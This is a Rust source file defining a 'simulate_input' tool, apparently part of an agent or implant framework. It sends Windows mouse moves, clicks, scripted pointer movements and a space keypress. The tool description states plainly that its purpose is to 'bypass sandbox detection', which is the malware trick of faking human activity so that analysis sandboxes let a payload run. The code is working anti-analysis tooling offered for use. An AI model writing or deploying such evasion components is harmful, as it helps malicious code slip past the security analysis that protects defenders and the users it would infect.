use anyhow::Result;
use serde_json::Value;
use crate::tools::Tool;
use async_trait::async_trait;

#[cfg(windows)]
use winapi::um::winuser::{
    INPUT, INPUT_MOUSE, MOUSEEVENTF_MOVE, MOUSEEVENTF_LEFTDOWN, MOUSEEVENTF_LEFTUP,
    MOUSEEVENTF_ABSOLUTE, SendInput, GetSystemMetrics, SM_CXSCREEN, SM_CYSCREEN,
    INPUT_KEYBOARD, KEYEVENTF_KEYUP, VK_SPACE,
};

pub struct InputSimulator;

#[async_trait]
impl Tool for InputSimulator {
    fn name(&self) -> &str { "simulate_input" }
    fn description(&self) -> &str { "Simulates mouse/keyboard input to bypass sandbox detection. Args: action (mouse_move/click/random_move/keypress), x, y" }

    async fn execute(&self, args: Value) -> Result<Value> {
        let action = args["action"].as_str().ok_or(anyhow::anyhow!("Missing action"))?;

        #[cfg(windows)]
        unsafe {
            match action {
                "mouse_move" => {
                    let x = args["x"].as_i64().unwrap_or(500) as i32;
                    let y = args["y"].as_i64().unwrap_or(500) as i32;
                    
                    let screen_w = GetSystemMetrics(SM_CXSCREEN);
                    let screen_h = GetSystemMetrics(SM_CYSCREEN);
                    let abs_x = (x * 65535) / screen_w;
                    let abs_y = (y * 65535) / screen_h;

                    let mut input: INPUT = std::mem::zeroed();
                    input.type_ = INPUT_MOUSE;
                    let mi = input.u.mi_mut();
                    mi.dx = abs_x;
                    mi.dy = abs_y;
                    mi.dwFlags = MOUSEEVENTF_MOVE | MOUSEEVENTF_ABSOLUTE;
                    
                    SendInput(1, &mut input, std::mem::size_of::<INPUT>() as i32);
                    
                    return Ok(serde_json::json!({ "status": "moved", "x": x, "y": y }));
                },
                "click" => {
                    let mut inputs: [INPUT; 2] = std::mem::zeroed();
                    
                    inputs[0].type_ = INPUT_MOUSE;
                    inputs[0].u.mi_mut().dwFlags = MOUSEEVENTF_LEFTDOWN;
                    
                    inputs[1].type_ = INPUT_MOUSE;
                    inputs[1].u.mi_mut().dwFlags = MOUSEEVENTF_LEFTUP;
                    
                    SendInput(2, inputs.as_mut_ptr(), std::mem::size_of::<INPUT>() as i32);
                    
                    return Ok(serde_json::json!({ "status": "clicked" }));
                },
                "random_move" => {
                    // Move mouse to 5 random positions
                    let screen_w = GetSystemMetrics(SM_CXSCREEN);
                    let screen_h = GetSystemMetrics(SM_CYSCREEN);
                    
                    for i in 0..5 {
                        let x = (100 + i * 150) % screen_w;
                        let y = (100 + i * 100) % screen_h;
                        let abs_x = (x * 65535) / screen_w;
                        let abs_y = (y * 65535) / screen_h;

                        let mut input: INPUT = std::mem::zeroed();
                        input.type_ = INPUT_MOUSE;
                        let mi = input.u.mi_mut();
                        mi.dx = abs_x;
                        mi.dy = abs_y;
                        mi.dwFlags = MOUSEEVENTF_MOVE | MOUSEEVENTF_ABSOLUTE;
                        
                        SendInput(1, &mut input, std::mem::size_of::<INPUT>() as i32);
                        std::thread::sleep(std::time::Duration::from_millis(100));
                    }
                    
                    return Ok(serde_json::json!({ "status": "random_moved", "positions": 5 }));
                },
                "keypress" => {
                    let mut inputs: [INPUT; 2] = std::mem::zeroed();
                    
                    inputs[0].type_ = INPUT_KEYBOARD;
                    inputs[0].u.ki_mut().wVk = VK_SPACE as u16;
                    
                    inputs[1].type_ = INPUT_KEYBOARD;
                    inputs[1].u.ki_mut().wVk = VK_SPACE as u16;
                    inputs[1].u.ki_mut().dwFlags = KEYEVENTF_KEYUP;
                    
                    SendInput(2, inputs.as_mut_ptr(), std::mem::size_of::<INPUT>() as i32);
                    
                    return Ok(serde_json::json!({ "status": "keypress_sent", "key": "SPACE" }));
                },
                _ => return Err(anyhow::anyhow!("Unknown action: {}", action)),
            }
        }

        #[cfg(not(windows))]
        return Err(anyhow::anyhow!("Input simulation only supported on Windows"));
    }
}
